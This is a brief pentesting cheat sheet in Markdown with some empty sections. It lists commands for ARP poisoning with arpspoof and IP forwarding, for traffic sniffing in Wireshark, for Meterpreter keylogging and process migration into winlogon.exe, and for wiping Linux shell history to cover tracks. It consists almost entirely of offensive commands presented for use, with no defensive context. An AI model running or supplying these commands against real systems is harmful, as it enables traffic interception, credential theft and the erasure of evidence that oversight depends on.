# 1 Info Gathering and Enumeration


# 2 Exploitation
## ARP Poisoning
```
echo 1 > /proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/ip_forward
```
```
arpspoof -i eth1 -t <ip1> -r <ip2>
```
```
sudo wireshark -i eth1 -k
```



# 3 Post-Exploitation
## Keylogging
```
meterpreter > getdesktop
```
```
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop
```
```
meterpreter > migrate -N winlogon.exe
```

## Clear Linux History
```
cat /dev/null > ~/.bash_history
history -c
```

## Clear Windows Event Logs
```
```
